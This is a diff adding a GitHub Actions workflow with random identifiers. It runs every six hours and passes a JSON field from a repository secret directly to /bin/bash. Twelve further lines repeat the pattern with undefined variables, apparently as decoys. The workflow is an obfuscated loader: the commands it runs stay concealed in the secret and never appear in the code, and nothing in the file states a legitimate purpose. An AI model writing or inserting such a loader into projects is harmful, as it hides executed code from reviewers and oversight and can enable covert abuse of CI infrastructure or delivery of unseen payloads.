@@ -1,0 +1,29 @@
+name: huranhuangshenbaiyang
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '53 0/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: huranhuangshenbaiyang
+        env:
+          gqrtc8: ${{ secrets.gqrtc8 }}
+        run: |
+          echo $gqrtc8 | jq -r .egd212 | /bin/bash
+          echo $zyxe98 | jq -r .trax90 | /bin/bash
+          echo $w00987 | jq -r .bsou68 | /bin/bash
+          echo $vjn95869 | jq -r .zlig3761 | /bin/bash
+          echo $rc02 | jq -r .d45 | /bin/bash
+          echo $quuu4478 | jq -r .op00 | /bin/bash
+          echo $igcf2 | jq -r .szau67764 | /bin/bash
+          echo $yv33449 | jq -r .nv0 | /bin/bash
+          echo $clzfr06 | jq -r .pmpy5097 | /bin/bash
+          echo $a7657 | jq -r .druav17 | /bin/bash
+          echo $ghtmq8466 | jq -r .nainq2 | /bin/bash
+          echo $jooo44 | jq -r .or735 | /bin/bash
+          echo $dzze53 | jq -r .ds648 | /bin/bash
+
